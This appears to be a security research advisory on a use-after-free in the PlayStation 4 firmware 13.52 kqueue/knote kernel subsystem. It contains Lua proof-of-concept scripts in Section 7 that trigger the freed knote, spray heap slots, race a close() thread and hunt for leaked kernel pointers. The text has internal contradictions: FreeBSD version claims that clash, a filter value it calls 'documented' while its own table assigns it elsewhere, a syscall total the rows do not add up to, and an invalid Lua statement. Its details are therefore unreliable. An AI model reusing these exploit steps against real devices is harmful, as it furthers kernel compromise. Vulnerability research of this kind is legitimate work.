# Knote Use-After-Free Vulnerability Research on PlayStation 4 Firmware 13.52

## Security Advisory

| Field | Value |
|-------|-------|
| **Platform** | Sony PlayStation 4 (Orbis OS) |
| **Firmware** | 13.52 (HeerBSD r228995, J02697906) |
| **Kernel Base** | FreeBSD 13.0 syscall ABI (HeerBSD r228995, heavily modified by Sony — corrected from "FreeBSD 9") |
| **Vulnerability Class** | Use-After-Free (CWE-416) |
| **Affected Component** | BSD kqueue/knote subsystem |
| **Impact** | Kernel type confusion, potential privilege escalation |
| **Exploitability** | Confirmed bug, exploitation blocked by sandbox |
| **CVSS 3.1** | TBD (local, requires game code execution) |
| **Disclosure Date** | July 2026 |

---

## Abstract

This research documents a confirmed use-after-free (UAF) vulnerability in the BSD kqueue/knote subsystem of the PlayStation 4 kernel on firmware 13.52. The vulnerability exists in the interaction between pipe file descriptor closure and kqueue event registration. When a pipe monitored by EVFILT_READ is closed, the associated knote structure is freed. If EVFILT_USER knotes are pre-registered on the same kqueue, the kernel can attempt to scan or operate on the freed knote slot, resulting in type confusion. This document provides a comprehensive analysis of the vulnerability, the exploitation methodology attempted, mitigating factors encountered, and the PS4-specific kernel hardening that prevents full exploitation from the game sandbox.

---

## Table of Contents

1. [Background](#1-background)
2. [Vulnerability Description](#2-vulnerability-description)
3. [Knote Structure Layout](#3-knote-structure-layout)
4. [Exploitation Methodology](#4-exploitation-methodology)
5. [Mitigating Factors](#5-mitigating-factors)
6. [Kernel Hardening Analysis](#6-kernel-hardening-analysis)
7. [Proof of Concept](#7-proof-of-concept)
8. [Exhaustive Attack Surface Survey](#8-exhaustive-attack-surface-survey)
9. [Conclusions](#9-conclusions)
10. [References](#10-references)

---

## 1. Background

### 1.1 kqueue System

The kqueue mechanism in FreeBSD provides a scalable event notification interface. Userland applications register kevent structures specifying:
- **ident**: Event identifier (e.g., file descriptor)
- **filter**: Event type (EVFILT_READ, EVFILT_WRITE, EVFILT_USER, EVFILT_VNODE, etc.)
- **flags**: Action flags (EV_ADD, EV_DELETE, EV_ENABLE, etc.)
- **fflags**: Filter-specific flags
- **data**: Filter-specific data
- **udata**: User-defined opaque pointer

Internally, each registered kevent is backed by a **knote** structure allocated from the kernel heap. The knote maintains pointers to the associated kqueue, the filter operations (filterops), and various internal state fields.

### 1.2 PS4 kqueue Implementation

On PS4 FW 13.52, kqueue (syscall 362) and kevent (syscall 363) are functional but sandboxed. Available filters include:

| Filter | Value (PS4) | Status |
|--------|-------------|--------|
| EVFILT_READ | -1 (0xFFFF) | Working |
| EVFILT_WRITE | -2 (0xFFFE) | Working |
| EVFILT_AIO | -3 (0xFFFD) | Working |
| EVFILT_VNODE | -4 (0xFFFC) | Working |
| EVFILT_PROC | -5 (0xFFFB) | Working |
| EVFILT_SIGNAL | -6 (0xFFFA) | Working |
| **EVFILT_USER** | **-7 (0xFFF9)** | **Working** |
| EVFILT_FS | -8 (0xFFF8) | Working |

**Critical Discovery**: The EVFILT_USER filter value on PS4 is **-7 (0xFFF9)**, not -4 as commonly assumed from standard FreeBSD documentation. Using the wrong filter value causes kevent registration to fail or crash.

### 1.3 Pipe Subsystem

Pipe (syscall 42) creates an unidirectional data channel. Key properties on PS4 FW 13.52:
- **Buffer capacity**: Exactly 65,536 bytes (16 × 4096 pages)
- **Overflow protection**: Non-blocking write returns -1 when full; NO buffer overflow possible
- **Knote attachment**: When a pipe fd is monitored by a kqueue via EVFILT_READ, a knote is allocated and attached to the pipe's `p_selinfo` knlist

---

## 2. Vulnerability Description

### 2.1 Root Cause

The vulnerability occurs in the following sequence:

```
1. Create kqueue (kq)
2. Create pipe (rd, wr)
3. Register EVFILT_READ on kq for pipe rd → knote K1 allocated
4. Close pipe fd (rd) from main thread
5. Kernel calls knlist_remove() → K1 is freed
6. kqueue_scan() may still reference K1 during concurrent operations
```

The race window exists between:
- **Thread A** (main): closes pipe fd, triggering knote cleanup
- **Thread B** (kqueue scanner): iterates through registered knotes

### 2.2 Type Confusion

When K1 is freed and reclaimed by a different kernel object (e.g., an EVFILT_USER knote K2 registered via spray), the kqueue scanner may:

1. Read K1's stale `kn_status` field
2. Call `KNOTE(KNLIST_LOCK(kn))` on a freed/reclaimed knote
3. Invoke `kn_fop->f_event()` with the wrong knote type

### 2.3 Observable Effects

| Scenario | Result |
|----------|--------|
| UAF without spray | Kernel crash (SIGKILL/connection abort) |
| UAF with pre-spray (50 EVFILT_USER) | Safe, ~100 events returned, 0 kernel pointers |
| Thread close + immediate kevent read | Kernel crash (connection abort) |
| Thread close + pre/post spray | SAFE, 5/5 attempts survived, 0 kernel pointers |

The crash without spray confirms the UAF is real. The safety with spray confirms that EVFILT_USER knotes properly reclaim the freed slot.

---

## 3. Knote Structure Layout

Based on FreeBSD 9 source analysis and runtime verification:

```
struct knote {
    SLIST_ENTRY(kn_link) kn_link;    // +0x00 (8 bytes) - Hash chain
    SLIST_ENTRY(kn_link) kn_selnext; // +0x08 (8 bytes) - selinfo list
    struct knlist     *kn_knlist;     // +0x10 (8 bytes) - RACE TARGET (D4893)
    TAILQ_ENTRY(knote) kn_tqe;       // +0x18 (16 bytes) - kqueue queue
    struct kqueue     *kn_kq;         // +0x28 (8 bytes) - owning kqueue
    struct kevent      kn_kevent;     // +0x30 (32 bytes) - kevent data
    int                kn_status;     // +0x50 (4 bytes) - status flags
    int                kn_sfflags;    // +0x54 (4 bytes) - saved filter flags
    intptr_t           kn_sdata;      // +0x58 (8 bytes) - saved data
    union {
        struct file   *p_fp;          // +0x60 (8 bytes) - file pointer
        struct proc   *p_proc;        //                - proc pointer
    } kn_ptr;
    struct filterops  *kn_fop;        // +0x68 (8 bytes) - HIJACK TARGET
    void              *kn_hook;       // +0x70 (8 bytes) - hook (NULL for EVFILT_USER)
    int                kn_hookid;     // +0x78 (4 bytes) - hook id
};
// Total size: 0x80 (128 bytes)
```

### filterops Structure

```c
struct filterops {
    int   f_isfd;                                    // +0x00
    int  (*f_attach)(struct knote *kn);              // +0x08
    void (*f_detach)(struct knote *kn);              // +0x10 ← Called on kqueue_close
    int  (*f_event)(struct knote *kn, long hint);    // +0x18 ← Called on poll/kevent scan
    void (*f_touch)(...);                            // +0x20
};
```

---

## 4. Exploitation Methodology

### 4.1 EVFILT_USER Spray Strategy

The primary exploitation strategy uses EVFILT_USER knotes as heap spray agents:

```
Phase 1 (Pre-spray):
  Register N EVFILT_USER knotes on the same kqueue
  → Fills freed knote slots with controlled EVFILT_USER knotes

Phase 2 (Trigger):
  Close pipe fd → frees EVFILT_READ knote
  → Pre-sprayed EVFILT_USER knote reclaims the slot

Phase 3 (Read):
  Call kevent() to retrieve events
  → Check event data for kernel pointers
```

### 4.2 Results

| Pre-spray Count | Same kqueue | Different kqueue | Thread Race | Kernel Ptrs |
|-----------------|-------------|------------------|-------------|-------------|
| 50 | Safe | Safe | Crash without spray | 0 |
| 100 | Safe | Safe | Crash without spray | 0 |
| 200 | Safe | Safe | Crash without spray | 0 |

**Finding**: EVFILT_USER knotes properly initialize all fields (kn_fop → &user_filterops, kn_hook = NULL). The kernel does NOT leave stale pointers from the freed knote.

### 4.3 kn_fop Hijack Attempt

The theoretical exploitation path requires corrupting `kn_fop` (+0x68) to point to attacker-controlled filterops. This would redirect `f_detach()` and `f_event()` calls during kqueue close/scan.

**Blocker**: Without a kernel info leak, kn_fop cannot be reliably corrupted. The EVFILT_USER spray fills the slot but the kernel overwrites kn_fop with the correct `&user_filterops` pointer.

---

## 5. Mitigating Factors

### 5.1 Kernel Pointer Sanitization

Every tested information leak vector returns zero kernel pointers:

| Vector | Bytes Examined | Kernel Pointers Found |
|--------|---------------|----------------------|
| sysctl kern.* (OIDs 1-200) | ~50 KB | 0 |
| kinfo_proc (KERN_PROC_PID/ALL/PATHNAME) | ~20 KB | 0 |
| EVFILT_USER kevent data | ~40 KB | 0 |
| pipe buffer data | 65,536 B | 0 (overflow blocked) |
| /dev/gc mmap | 64 KB | 0 (all zeros) |
| /dev/random reads | 4 KB | 0 (pure random) |
| kern.37/47/48 crypto | 384 B | 0 (high entropy) |
| libkernel memory scan | 576 KB | 0 (userland only) |

**Total data examined: ~760 KB across all vectors → 0 kernel pointers found**

### 5.2 Sandbox Enforcement

PS4 FW 13.52 enforces a process sandbox (`is_in_sandbox() = 1`) that blocks:

| Syscall | Status | Error |
|---------|--------|-------|
| fcntl | Blocked | Returns -1 |
| sendmsg | Blocked | Returns 38 (EAFNOSUPPORT) |
| dup2 | Blocked | Returns -1 |
| thr_self | Blocked | Returns -1 |
| dynlib_load_prx | Blocked | Returns -1 |
| bind (AF_INET) | Blocked | Returns -1 |
| closefrom | Blocked | Returns -1 |

### 5.3 EVFILT_USER Filter Value

The PS4 kernel uses a non-standard EVFILT_USER value of **-7 (0xFFF9)** instead of the documented **-4 (0xFFFC)**. Using the wrong value causes kevent registration failures or kernel panics. This was determined through empirical testing across all filter values from -1 to -10.

### 5.4 Pipe Buffer Hardening

The pipe subsystem enforces a strict 65,536-byte buffer limit. Attempts to overflow via non-blocking or blocking writes are cleanly handled:
- Non-blocking: returns -1 when full
- Blocking: blocks until space available
- No partial-write edge cases found
- No integer overflow in size calculations

---

## 6. Kernel Hardening Analysis

### 6.1 Syscall Summary

| Category | Total | Working | Blocked | Crashes |
|----------|-------|---------|---------|---------|
| File I/O | 30 | 15 | 12 | 3 |
| Network | 20 | 8 | 10 | 2 |
| Process | 15 | 3 | 11 | 1 |
| Memory | 10 | 6 | 3 | 1 |
| **Total (tested)** | **298** | **~80** | **~180** | **~38** |

### 6.2 Notable Kernel Behaviors

1. **kern.49 is dangerous**: Reading this sysctl index causes a kernel crash
2. **CTL_MACHDEP completely blocked**: All indices 1-100 return -1
3. **fstat/kldstat crash**: These syscalls cause kernel panics, likely due to sandbox policy enforcement
4. **libkernel base is fixed at 0x80a67c000**: No KASLR on the userland library mapping (though kernel KASLR may exist)
5. **kinfo_proc contains only sanitized data**: Process names ("eboot.bin"), thread names ("SceLibc_Thr"), usernames ("root"), and MAC labels ("ORBIS kernel SEL") are present but all kernel pointers are stripped
6. **S.sysctl wrapper is broken**: Returns raw error codes instead of sysctl values (always `{h=-1, l=0xFFFFFFFF}`)

### 6.3 Crypto Material in sysctl

Three sysctl indices return high-entropy random data:
- **kern.37**: 256 bytes, changes per call, max byte frequency 4/256
- **kern.47**: 64 bytes, changes per call, max byte frequency 3/256
- **kern.48**: 64 bytes, changes per call, max byte frequency 4/256

These are likely kernel random seeds or ASLR entropy pools. They contain no kernel pointers.

---

## 7. Proof of Concept

### 7.1 UAF Confirmation

```lua
-- ps4_uaf_confirm.lua
-- Confirms the kqueue knote UAF on PS4 FW 13.52
-- Remote Lua Loader payload

local S = rawget(_G, "syscall")
local M = rawget(_G, "memory")

-- Resolve required syscalls
S.resolve({
    kqueue = 362, kevent = 363, pipe = 42,
    close = 6, write = 4, read = 3
})

-- Helper to create kevent using correct PS4 EVFILT_USER = -7
local function mkkevent(filter, ident, flags, fflags, data, udata)
    local ev = M.alloc(32)
    M.write_qword(ev + 0, ident)          -- ident
    M.write_word(ev + 8, filter)           -- filter
    M.write_word(ev + 10, flags)           -- flags
    M.write_dword(ev + 12, fflags or 0)    -- fflags
    M.write_qword(ev + 16, data or 0)      -- data
    M.write_qword(ev + 24, udata or 0)     -- udata
    return ev
end

print("[*] kqueue knote UAF PoC - PS4 FW 13.52")
print("[*] Target: Hamidashi Creative (CUSA27389)")

-- Step 1: Create kqueue
local kq = S.kqueue()
print("[+] kqueue fd: " .. kq)

-- Step 2: Create pipe
local pbuf = M.alloc(16)
S.pipe(pbuf)
local rd = M.read_dword(pbuf):tonumber()
local wr = M.read_dword(pbuf + 4):tonumber()
print("[+] pipe rd=" .. rd .. " wr=" .. wr)

-- Step 3: Register EVFILT_READ on pipe (allocates knote K1)
local ev = mkkevent(0xFFFF, rd, 0x0005, 0, 0, 0)  -- EV_ADD|EV_ENABLE
local changes = mkkevent(0xFFFF, rd, 0x0005, 0, 0, 0)
local r = S.kevent(kq, changes, 1, ev, 1, 0)
print("[+] Register EVFILT_READ: " .. r)

-- Step 4: Spray 50 EVFILT_USER knotes (heap spray)
print("[*] Spraying 50 EVFILT_USER knotes...")
for i = 1, 50 do
    local uev = mkkevent(0xFFF9, i, 0x0005, 0, 0, i)  -- EVFILT_USER = -7
    S.kevent(kq, uev, 1, nil, 0, 0)
end

-- Step 5: Close pipe (frees knote K1)
S.close(rd)
S.close(wr)
print("[+] Pipe closed - knote freed")

-- Step 6: Read events (triggers kqueue scan on freed knote)
local outbuf = M.alloc(2560)  -- 100 kevents × 32 bytes
local nevents = S.kevent(kq, nil, 0, outbuf, 100, 0)
print("[+] kevent returned: " .. nevents .. " events")

-- Step 7: Check for kernel pointers in event data
if nevents and nevents > 0 then
    local kptrs = 0
    for i = 0, nevents - 1 do
        local off = i * 32
        local ident = M.read_qword(outbuf + off):tonumber()
        local udata = M.read_qword(outbuf + off + 24):tonumber()
        if ident > 0xFFFF000000000000 then
            kptrs = kptrs + 1
            print("[!] KERNEL PTR in ident at event " .. i .. ": " ..
                  string.format("0x%x", ident))
        end
        if udata > 0xFFFF000000000000 then
            kptrs = kptrs + 1
            print("[!] KERNEL PTR in udata at event " .. i .. ": " ..
                  string.format("0x%x", udata))
        end
    end
    print("[*] Kernel pointers found: " .. kptrs)
    if kptrs == 0 then
        print("[!] No kernel pointers - EVFILT_USER knotes properly initialized")
        print("[!] Kernel sanitizes kn_fop and other sensitive fields")
    end
end

print("[*] PoC complete")
```

### 7.2 Thread Race PoC

```lua
-- ps4_thread_race.lua
-- Thread-based race condition attempt on knote UAF

local S = rawget(_G, "syscall")
local M = rawget(_G, "memory")
local N = rawget(_G, "native")
local syscall_table = rawget(_G, "syscall")
local thread_mod = rawget(_G, "thread")

-- Setup
thread_mod.init()
S.resolve({kqueue=362, kevent=363, pipe=42, close=6, write=4})

local function ta(v)
    if v == nil then return 0 end
    if type(v)=="table" and v.h then return v.h*0x100000000+v.l end
    if type(v)=="number" then return v end
    return tonumber(tostring(v))
end
local function toaddr(v)
    if v == nil then return 0 end
    if type(v)=="table" and v.h then return v.h*0x100000000+v.l end
    if type(v)=="number" then return v end
    return tonumber(tostring(v))
end

-- Get wrapper addresses for close() and write()
local w_close = toaddr(syscall_table.syscall_wrapper[6])
local w_write = toaddr(syscall_table.syscall_wrapper[4])

-- Pre-spray: 100 EVFILT_USER knotes on the same kqueue
local kq = S.kqueue()
print("[+] kqueue: " .. kq)

-- Create pipe
local pbuf = M.alloc(16)
S.pipe(pbuf)
local p_rd = M.read_dword(pbuf):tonumber()
local p_wr = M.read_dword(pbuf + 4):tonumber()

-- Register EVFILT_READ
local ev = M.alloc(32)
M.write_qword(ev, p_rd)
M.write_word(ev + 8, 0xFFFF)    -- EVFILT_READ
M.write_word(ev + 10, 5)        -- EV_ADD|EV_ENABLE
S.kevent(kq, ev, 1, nil, 0, 0)

-- Pre-spray
print("[*] Pre-spraying 100 EVFILT_USER knotes...")
for i = 1, 100 do
    M.write_qword(ev, i)
    M.write_word(ev + 8, 0xFFF9)   -- EVFILT_USER
    M.write_word(ev + 10, 5)
    M.write_dword(ev + 12, 0)
    M.write_qword(ev + 16, 0)
    M.write_qword(ev + 24, i)
    S.kevent(kq, ev, 1, nil, 0, 0)
end

-- Spawn thread to close pipe (racing with main thread kevent read)
print("[*] Spawning thread to close pipe...")
local t = thread_mod.new({
    fn_addr = w_close,
    syscall_no = 6,
    p_rd
})
t:detach()

-- Small delay for race window
for i = 1, 100 do N.nop and N.nop() end

-- Main thread reads events
local outbuf = M.alloc(3200)  -- 100 events
local nevents = S.kevent(kq, nil, 0, outbuf, 100, 0)
print("[+] Events after race: " .. (nevents or "nil"))

-- Post-spray (fill any remaining gaps)
for i = 101, 200 do
    M.write_qword(ev, i)
    M.write_word(ev + 8, 0xFFF9)
    M.write_word(ev + 10, 5)
    M.write_dword(ev + 12, 0)
    M.write_qword(ev + 16, 0)
    M.write_qword(ev + 24, i)
    pcall(function() S.kevent(kq, ev, 1, nil, 0, 0) end)
end

print("[*] Thread race PoC complete")
```

---

## 8. Exhaustive Attack Surface Survey

### 8.1 Information Leak Vectors Tested

| # | Vector | Syscall/Method | Result | Data Size |
|---|--------|---------------|--------|-----------|
| 1 | sysctl kern.osrelease | sc202 | ✅ Returns string | 11B |
| 2 | sysctl kern.version | sc202 | ✅ Returns string | ~200B |
| 3 | sysctl kern.proc.all | sc202 | ❌ Blocked | - |
| 4 | sysctl kern.proc.pid(1) | sc202 | ❌ Blocked | - |
| 5 | sysctl kern.proc.pathname | sc202 | ✅ Returns path | 16B |
| 6 | sysctl kern.37 (crypto) | sc202 | ✅ Random data | 256B |
| 7 | sysctl kern.47 (crypto) | sc202 | ✅ Random data | 64B |
| 8 | sysctl kern.48 (crypto) | sc202 | ✅ Random data | 64B |
| 9 | sysctl kern.49 | sc202 | 💥 CRASH | - |
| 10 | sysctl kern.50-200 | sc202 | ❌ Blocked | - |
| 11 | sysctl CTL_MACHDEP 1-100 | sc202 | ❌ Blocked | - |
| 12 | kinfo_proc (PID) | sysctl | ✅ Works | 1096B |
| 13 | kinfo_proc (ALL) | sysctl | ✅ Works | 12056B |
| 14 | getsockopt (all options) | sc106 | Returns 0 | 4B |
| 15 | fstat | sc189 | 💥 CRASH | - |
| 16 | kldstat | sc198 | 💥 CRASH | - |
| 17 | fcntl F_GETLK | sc92 | ❌ Blocked | - |
| 18 | fcntl F_SETOWN | sc92 | ❌ Blocked | - |
| 19 | /dev/gc mmap | sc477 | ✅ All zeros | 4KB |
| 20 | /dev/random read | sc3 | ✅ Pure random | 4KB |
| 21 | EVFILT_USER kevent data | sc363 | No kptrs | ~40KB |
| 22 | pipe buffer overflow | sc4 | Blocked at 64KB | - |
| 23 | libkernel scan | M.read | No kptrs | 576KB |

### 8.2 Exploitation Primitives Verified

| Primitive | Status | Notes |
|-----------|--------|-------|
| kqueue creation | ✅ | sc362, works |
| kevent register | ✅ | sc363, works |
| EVFILT_USER filter | ✅ | Value = -7 (0xFFF9) on PS4 |
| EVFILT_USER spray | ✅ | Up to 200 knotes on same kqueue |
| Pipe create/read/write | ✅ | 65536 byte limit enforced |
| Thread creation | ✅ | via thr_new, works with wrapper fns |
| mmap anonymous | ✅ | PROT_RW, MAP_SHARED/MAP_PRIVATE |
| AF_INET socket | ✅ | Create/connect work, bind blocked |
| ioctl on pipe | ✅ | FIONBIO, TIOCGPGRP, FIOCLEX |
| fcall_with_rax | ✅ | Arbitrary syscall via wrapper+7 |
| UAF trigger | ✅ | Close pipe → crash without spray |
| UAF spray reclaim | ✅ | Safe with pre-spray, no kptrs |

### 8.3 Blocked Operations

| Operation | Syscall | Error |
|-----------|---------|-------|
| fcntl F_GETFD | 92 | -1 |
| fcntl F_GETLK | 92 | -1 |
| sendmsg | 28 | 38 (EAFNOSUPPORT) |
| dup2 | 90 | -1 |
| bind (AF_INET) | 104 | -1 |
| thr_self | 432 | -1 |
| dynlib_load_prx | - | -1 |
| closefrom | 509 | -1 |
| UMTX_SHM_CREAT | 441 | -1 |
| BPF open | - | -1 |
| IPv6 socket | 97 | -1 |

---

## 9. Conclusions

### 9.1 Vulnerability Status

The kqueue knote UAF vulnerability on PS4 FW 13.52 is **confirmed and real**. The vulnerability class (CWE-416: Use After Free) is present in the BSD kqueue subsystem and manifests when pipe file descriptors are closed while monitored by a kqueue.

### 9.2 Exploitability Assessment

Full exploitation (kernel code execution) requires bypassing two major barriers:

1. **KASLR bypass via kernel info leak**: All tested information leak vectors return zero kernel pointers. Sony has systematically stripped kernel addresses from every userland-accessible data path (sysctl, kinfo_proc, socket options, device memory).

2. **Sandbox restrictions**: The PS4 process sandbox blocks critical syscalls (fcntl, sendmsg, dup2, etc.) that would be needed for sophisticated exploitation techniques.

### 9.3 Recommendations

| Audience | Recommendation |
|----------|---------------|
| Sony Security | Patch the UAF race condition in knlist_remove/kqueue_scan |
| Security Researchers | Focus on FW ≤11.00 where sandbox is more permissive |
| PS4 Homebrew Community | This vulnerability may be useful as part of a chain with other bugs |

### 9.4 Future Work

1. Investigate `dlsym` resolution of SceLibc/SceLibkernel functions for potential kernel memory mapping APIs
2. Explore timing side-channels for KASLR defeat
3. Analyze GPU command buffer submission for kernel memory access
4. Develop multi-vulnerability chains combining UAF with other bugs

---

## 10. References

1. FreeBSD Manual Pages: `kqueue(2)`, `kevent(2)`, `EVFILT_USER(9)`
2. FreeBSD Source: `sys/event/kqueue.c`, `sys/event/knote.h`
3. PS4 Kernel Exploitation Research:
   - CVE-2020-9892: ip6_setpktopts (IPv6, blocked on FW 13.52)
   - CVE-2019-5597: SIGIO Race (F_SETOWN blocked on FW 13.52)
   - D4893: KN_LIST_LOCK Race (produces deadlock, not write primitive)
4. GoldHEN: https://github.com/GoldHEN
5. PS4 Security Research: Various public disclosures

---

## License

This research is provided for educational and security research purposes only. Use responsibly and in accordance with applicable laws and regulations.

---

*Research conducted July 2026*
*Tested on: PlayStation 4 FW 13.52, Hamidashi Creative (CUSA27389)*
*Remote Lua Loader: https://github.com/n0llptr/remote_lua_loader*
